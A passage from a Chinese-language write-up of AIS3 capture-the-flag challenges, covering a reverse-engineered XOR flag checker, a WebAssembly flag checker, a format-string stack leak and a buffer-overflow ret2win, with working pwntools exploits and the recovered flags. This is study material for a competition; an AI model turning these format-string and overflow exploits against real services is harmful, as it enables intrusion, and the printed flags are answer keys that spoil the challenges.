  v8[5] = 874076697;
  v8[6] = 1127428440;
  v8[7] = 1510228243;
  v8[8] = 743978009;
  v8[9] = 54940467;
  v8[10] = 1246382110;
  qmemcpy(v7, "rikki_l0v3", sizeof(v7));
  while ( 1 )
  {
    *((_BYTE *)v8 + v1++) = v2 ^ v3;
    if ( v1 == 45 )
      break;
    v2 = *((_BYTE *)v8 + v1);
    v3 = v7[v1 % 0xA];
  }
  for ( i = 0; i != 45; ++i )
  {
    v5 = *(_BYTE *)(a1 + i);
    if ( !v5 || v5 != *((_BYTE *)v8 + i) )
      return 0;
  }
  return *(_BYTE *)(a1 + 45) == 0;
}
```
然後就叫Gemini寫個code算出flag:
```python=
import struct

def calculate_target_string_bytes():
    v8_ints = [
        1480073267, 1197221906, 254628393, 920154, 1343445007,
        874076697, 1127428440, 1510228243, 743978009, 54940467,
        1246382110
    ]

    v8_buffer = bytearray(45) 

    current_offset = 0
    for val in v8_ints:
        packed_bytes = struct.pack('<i', val)
        for i in range(len(packed_bytes)):
            if current_offset < 44: # 只填滿由 v8_ints 提供的 44 bytes
                v8_buffer[current_offset] = packed_bytes[i]
                current_offset += 1
            else:
                break
    key_v7 = b"rikki_l0v3"
    c_v1 = 0  
    c_v2 = 51
    c_v3 = 114

    while True:
        xor_result = (c_v2 ^ c_v3) & 0xFF 
        v8_buffer[c_v1] = xor_result
        c_v1 += 1

        # if ( v1 == 45 ) break;
        if c_v1 == 45:
            break
        
        # v2 = *((_BYTE *)v8 + v1);
        c_v2 = v8_buffer[c_v1]
        
        # v3 = v7[v1 % 0xA];
        c_v3 = key_v7[c_v1 % 10] # 10 是 0xA

    return bytes(v8_buffer)

if __name__ == "__main__":
    target_bytes = calculate_target_string_bytes()

    print(f"計算出的目標位元組序列 (長度: {len(target_bytes)} bytes):")
    print(f"  Hex: {target_bytes.hex()}")
    print(f"  Bytes literal: {target_bytes}")

    try:
        decoded_string = target_bytes.decode('utf-8')
        print(f"  UTF-8 解碼: \"{decoded_string}\"")
    except UnicodeDecodeError:
        try:
            decoded_string = target_bytes.decode('latin-1')
            print(f"  Latin-1 解碼: \"{decoded_string}\"")
        except UnicodeDecodeError:
            print("  無法使用 UTF-8 或 Latin-1 解碼為可讀字串。")
```
> Flag:AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}


## web flag checker
題目是一個網站, 裡面有一個輸入框和submit按鈕可以送flag, 並檢查flag有沒有錯

透過check source可以看到裡面有個js檔案, 看得出來應該有用什麼WebAssembly之類的東西

開network看 還有匯入個index.wasm檔案:
![CleanShot 2025-05-31 at 16.18.03@2x](https://hackmd.io/_uploads/rJwrsVdMle.png)

使用wasm-decompile就可以反編譯, 直接找到關鍵點:
```typescript=
export function flagchecker(a:int):int { // func9
  var b:int = g_a;
  var c:int = 96;
  var d:int = b - c;
  g_a = d;
  d[22]:int = a;
  var e:int = -39934163;
  d[21]:int = e;
  var f:int = 64;
  var g:long_ptr = d + f;
  var h:long = 0L;
  g[0] = h;
  var i:int = 56;
  var j:long_ptr = d + i;
  j[0] = h;
  var k:int = 48;
  var l:long_ptr = d + k;
  l[0] = h;
  d[5]:long = h;
  d[4]:long = h;
  var m:long = 7577352992956835434L;
  d[4]:long = m;
  var n:long = 7148661717033493303L;
  d[5]:long = n;
  var o:long = -7081446828746089091L;
  d[6]:long = o;
  var p:long = -7479441386887439825L;
  d[7]:long = p;
  var q:long = 8046961146294847270L;
  d[8]:long = q;
  var r:int = d[22]:int;
  var s:int = 0;
  var t:int = r != s;
  var u:int = 1;
  var v:int = t & u;
  if (eqz(v)) goto B_c;
  var w:int = d[22]:int;
  var x:int = f_n(w);
  var y:int = 40;
  var z:int = x != y;
  var aa:int = 1;
  var ba:int = z & aa;
  if (eqz(ba)) goto B_b;
  label B_c:
  var ca:int = 0;
  d[23]:int = ca;
  goto B_a;
  label B_b:
  var da:int = d[22]:int;
  d[7]:int = da;
  var ea:int = 0;
  d[6]:int = ea;
  loop L_e {
    var fa:int = d[6]:int;
    var ga:int = 5;
    var ha:int = fa < ga;
    var ia:int = 1;
    var ja:int = ha & ia;
    if (eqz(ja)) goto B_d;
    var ka:int = d[7]:int;
    var la:int = d[6]:int;
    var ma:int = 3;
    var na:int = la << ma;
    var oa:long_ptr = ka + na;
    var pa:long = oa[0];
    d[2]:long = pa;
    var qa:int = d[6]:int;
    var ra:int = 6;
    var sa:int = qa * ra;
    var ta:int = -39934163;
    var ua:int = ta >> sa;
    var va:int = 63;
    var wa:int = ua & va;
    d[3]:int = wa;
    var xa:long = d[2]:long;
    var ya:int = d[3]:int;
    var za:long = f_i(xa, ya);
    var ab:int = d[6]:int;
    var bb:int = 32;
    var cb:int = d + bb;
    var db:int = cb;
    var eb:int = 3;
    var fb:int = ab << eb;
    var gb:long_ptr = db + fb;
    var hb:long = gb[0];
    var ib:int = za != hb;
    var jb:int = 1;
    var kb:int = ib & jb;
    if (eqz(kb)) goto B_f;
    var lb:int = 0;
    d[23]:int = lb;
    goto B_a;
    label B_f:
    var mb:int = d[6]:int;
    var nb:int = 1;
    var ob:int = mb + nb;
    d[6]:int = ob;
    continue L_e;
  }
  label B_d:
  var pb:int = 1;
  d[23]:int = pb;
  label B_a:
  var qb:int = d[23]:int;
  var rb:int = 96;
  var sb:int = d + rb;
  g_a = sb;
  return qb;
}
```
同樣丟給AI解XD

```python=
from struct import pack, unpack

def rol64(val, r):
    return ((val << r) & ((1 << 64) - 1)) | (val >> (64 - r))

# 目標常數 (以無號 64-bit 表示)
consts = [
    0x6a66ef8a662a2869,
    0x372337d7f4253563,
    0x7dddc5dca0a5b99d,
    0x2f1a38b8afaf3398,
    0x26474626878cac6f
]

shifts = [45, 28, 42, 39, 61]

parts = [rol64(c, 64 - r) for c, r in zip(consts, shifts)]
flag_bytes = b''.join(pack('<Q', p) for p in parts)
print(flag_bytes.decode())
```
> Flag: AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}
# Pwn
## Format Number
chal:
```c=
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#include <string.h>


void check_format(char *format) {
    for (int i = 0; format[i] != '\0'; i++) {
        char c = format[i];
        if (c == '\n') {
            format[i] = '\0';
            return;
        }
        if (!isdigit(c) && !ispunct(c)) {
            printf("Error format !\n");
            exit(1);
        }
    }
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    srand(time(NULL));
    int number = rand();
    int fd = open("/home/chal/flag.txt", O_RDONLY);
    char flag[0x100] = {0};
    read(fd, flag, 0xff);
    close(fd);
    
    char format[0x10] = {0};
    printf("What format do you want ? ");
    read(0, format, 0xf);
    check_format(format);

    char buffer[0x20] = {0};
    strcpy(buffer, "Format number : %3$");
    strcat(buffer, format);
    strcat(buffer, "d\n");
    printf(buffer, "Welcome", "~~~", number);

    return 0;
}
```

英文字母用不了, 但`printf`格式時會自動加上`d`, 就能用`%k$d`的方式讀stack的資料

然後要用`_`來串接, 不然會被視為同一個conversion

exploit:
```python=
from pwn import *
import re

flag = ""
for i in range(0, 60):
    p = remote("chals1.ais3.org", 50960)
    p.recvuntil(b"What format do you want ? ")
    p.sendline(f"_%{i}$".encode())
    resp = p.recvall().decode()
    log.info(resp)
    p.close()

    match = re.search(r"Format number : %_(-?\d+)\n", resp)
    if match:
        val = int(match.group(1))
        if 0 <= val <= 255:
            flag += chr(val)
            log.info(flag)
            if chr(val) == '}':
                break
```
> Flag: AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&_!!!}

## Welcome to the World of Ave Mujica🌙
chal:
```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[143]; // [rsp+0h] [rbp-A0h] BYREF
  char s[8]; // [rsp+8Fh] [rbp-11h] BYREF
  unsigned __int8 int8; // [rsp+97h] [rbp-9h]
  char *v7; // [rsp+98h] [rbp-8h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  printf("\x1B[2J\x1B[1;1H");
  printf("\x1B[31m");
  printf("%s", (const char *)banner);
  puts(&byte_402A78);
  puts(&byte_402AB8);
  fgets(s, 8, stdin);
  v7 = strchr(s, 10);
  if ( v7 )
    *v7 = 0;
  if ( strcmp(s, "yes") )
  {
    puts(&byte_402AE8);
    exit(1);
  }
  printf(&byte_402B20);
  int8 = read_int8();
  printf(&byte_402B41);
  read(0, buf, int8);
  return 0;
}

int Welcome_to_the_world_of_Ave_Mujica()
{
  puts(&s);
  puts(&byte_402990);
  puts(&byte_4029B4);
  puts(&byte_4029C3);
  puts(&byte_4029D2);
  puts(&byte_4029E1);
  puts(&byte_4029FC);
  puts(&byte_402A15);
  return execve("/bin/sh", 0, 0);
}

__int64 read_int8()
{
  char buf[4]; // [rsp+8h] [rbp-8h] BYREF
  int v2; // [rsp+Ch] [rbp-4h]

  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 > 127 )
  {
    puts(&byte_402A38);
    exit(1);
  }
  return (unsigned int)v2;
}
```
前面`read_int8()`輸入-1，讓他變255，這樣就可以讓輸入長度大於buf大小造成buffer overflow

padding長度就算buf的位置([rbp-A0h])再加上saved rbp

return address算`Welcome_to_the_world_of_Ave_Mujica`的address再跳過endbr64

![image](https://hackmd.io/_uploads/BkMlmotMel.png)

exploit:
```python=
from pwn import *
r = remote('chals1.ais3.org', 60179)
r.sendlineafter(b'?',b'yes')
r.sendlineafter(b':',b'-1')
r.sendline(b"a"*0xa8 + p64(0x40125a))
r.interactive()
```

> Flag: AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._b69760dea2dd3acca3b233b295dc7892}